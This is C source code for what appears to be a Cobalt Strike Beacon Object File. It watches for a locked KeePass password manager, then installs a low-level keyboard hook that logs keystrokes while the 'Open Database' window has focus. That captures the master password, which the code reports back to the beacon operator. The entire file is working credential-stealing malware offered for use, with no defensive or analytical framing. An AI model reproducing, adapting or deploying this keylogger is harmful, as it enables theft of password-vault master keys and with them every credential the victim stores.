#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "common.h"

/*
    Process
*/
BOOL ProcessExists(LPCWSTR szProcessName, DWORD* dwPid) {
    PROCESSENTRY32W procEntry = { .dwSize = sizeof(PROCESSENTRY32W) };
    *dwPid = 0;

    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] CreateToolhelp32Snapshot failed: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!KERNEL32$Process32FirstW(hSnapshot, &procEntry)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Process32FirstW failed: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        WCHAR lower[MAX_PATH] = { 0 };
        DWORD len = MSVCRT$wcslen(procEntry.szExeFile);
        for (DWORD i = 0; i < len && i < MAX_PATH - 1; i++)
            lower[i] = (WCHAR)MSVCRT$towlower(procEntry.szExeFile[i]);

        if (MSVCRT$wcscmp(lower, szProcessName) == 0) {
            *dwPid = procEntry.th32ProcessID;
            break;
        }
    } while (KERNEL32$Process32NextW(hSnapshot, &procEntry));

    KERNEL32$CloseHandle(hSnapshot);
    return (*dwPid != 0);
}

/*
    Window
*/
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
    ENUM_PARAM* param = (ENUM_PARAM*)lParam;
    DWORD dwPid = 0;
    USER32$GetWindowThreadProcessId(hWnd, &dwPid);
    if (dwPid == param->dwPid) {
        // The "Open database" window is the first window with a title for the KeePass process
        char title[256] = { 0 };
        USER32$GetWindowTextA(hWnd, title, sizeof(title));
        if (USER32$IsWindowVisible(hWnd) && title[0] != '\0') {
            param->hWnd = hWnd;
            MSVCRT$strncpy(param->title, title, sizeof(param->title) - 1);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL contains(char* str, char* str2) {
    return (MSVCRT$strstr(str, str2) != NULL);
}

BOOL IsLocked(DWORD dwPid) {
    ENUM_PARAM param = { .dwPid = dwPid, .hWnd = NULL };
    USER32$EnumWindows(EnumWindowsProc, (LPARAM)(&param));
    if (!param.hWnd)
        return FALSE;
    return contains(param.title, "Open Database");
}

/*
    Keylogger
*/
static char gBuffer[KEY_BUFFER_SIZE] = { 0 };
static int gPos = 0;
static HHOOK hHook = NULL;

VOID LogKey(const char* str) {
    int len = MSVCRT$strlen(str);
    if (gPos + len < KEY_BUFFER_SIZE - 1) {
        MSVCRT$memcpy(gBuffer + gPos, str, len);
        gPos += len;
    }
}

VOID FlushBuffer(VOID) {
    if (gPos > 0) {
        gBuffer[gPos] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured keystrokes: %s", gBuffer);
        BeaconWakeup();
        MSVCRT$memset(gBuffer, 0, KEY_BUFFER_SIZE);
        gPos = 0;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;

        // Only log keystrokes when the "Open Database" window is focused
        HWND hFg = USER32$GetForegroundWindow();
        if (hFg) {
            char title[256] = { 0 };
            USER32$GetWindowTextA(hFg, title, sizeof(title));
            if (!contains(title, "Open Database"))
                return USER32$CallNextHookEx(hHook, nCode, wParam, lParam);
        } else {
            return USER32$CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        BYTE keyState[256] = { 0 };
        if (USER32$GetAsyncKeyState(VK_SHIFT) & 0x8000) 
            keyState[VK_SHIFT]   = 0x80;
        if (USER32$GetAsyncKeyState(VK_LSHIFT) & 0x8000) 
            keyState[VK_LSHIFT]  = 0x80;
        if (USER32$GetAsyncKeyState(VK_RSHIFT) & 0x8000) 
            keyState[VK_RSHIFT]  = 0x80;
        if (USER32$GetKeyState(VK_CAPITAL) & 0x0001)      
            keyState[VK_CAPITAL] = 0x01;
        if (USER32$GetAsyncKeyState(VK_RMENU) & 0x8000) {
            keyState[VK_RMENU]   = 0x80;
            keyState[VK_CONTROL] = 0x80;
        }

        WCHAR wch[4] = { 0 };
        int conv = USER32$ToUnicode(kb->vkCode, kb->scanCode, keyState, wch, 4, 0);
        if (conv == 1 && wch[0] >= 0x20 && wch[0] < 0x7F) {
            char ch[2] = { (char)wch[0], 0 };
            LogKey(ch);
            return USER32$CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        BOOL ctrl = (USER32$GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (USER32$GetAsyncKeyState(VK_RCONTROL) & 0x8000);
        switch (kb->vkCode) {
            case VK_RETURN:     LogKey("[ENTER]");                              break;
            case VK_BACK:       LogKey(ctrl ? "[CTRL+BACK]" : "[BACK]");        break;
            case VK_TAB:        LogKey("[TAB]");                                break;
            case VK_DELETE:     LogKey(ctrl ? "[CTRL+DEL]" : "[DEL]");          break;
            case VK_ESCAPE:     LogKey("[ESC]");                                break;
            case VK_SPACE:      LogKey(" ");                                    break;
            case VK_LEFT:       LogKey(ctrl ? "[CTRL+LEFT]" : "[LEFT]");        break;
            case VK_RIGHT:      LogKey(ctrl ? "[CTRL+RIGHT]" : "[RIGHT]");      break;
            case VK_HOME:       LogKey("[HOME]");                               break;
            case VK_END:        LogKey("[END]");                                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_LMENU:
            case VK_RMENU: break;
            default: break;
        }
    }
    return USER32$CallNextHookEx(hHook, nCode, wParam, lParam);
}

/*
    Entry point
*/
VOID go(char* args, int argc) {

    datap parser;
    HANDLE hStop = BeaconGetStopJobEvent();
    BeaconDataParse(&parser, args, argc);

    gPos = 0;
    hHook = NULL;
    MSVCRT$memset(gBuffer, 0, KEY_BUFFER_SIZE);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for KeePass...\n");
    BeaconWakeup();

    DWORD dwPid = 0;
    WCHAR* szKeePass = L"keepass.exe";

_MONITOR:

    // Wait until a locked KeePass instance is found
    while (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid)) {
        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, 500, FALSE); // 500ms delay for process detection
        if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
            goto _CLEANUP;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Locked KeePass database detected (PID: %lu).\n", dwPid);
    BeaconWakeup();

    // Install keyboard hook
    hHook = USER32$SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] SetWindowsHookExA failed: %lu\n", KERNEL32$GetLastError());
        goto _CLEANUP;
    }

    DWORD lastCheck = KERNEL32$GetTickCount();
    while (TRUE) {
        DWORD wait = USER32$MsgWaitForMultipleObjects(1, &hStop, FALSE, 50, QS_ALLINPUT);
        if (wait == WAIT_OBJECT_0)
            goto _CLEANUP;

        MSG msg;
        while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE))
            USER32$DispatchMessageA(&msg);

        DWORD now = KERNEL32$GetTickCount();
        if (now - lastCheck >= 200) { // 200ms delay for unlock detection
            lastCheck = now;
            if (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid))
                break;
        }
    }

    // Uninstall keyboard hook
    USER32$UnhookWindowsHookEx(hHook);
    hHook = NULL;

    FlushBuffer();
    goto _MONITOR;

_CLEANUP:

    if (hHook) {
        USER32$UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
    return;
}
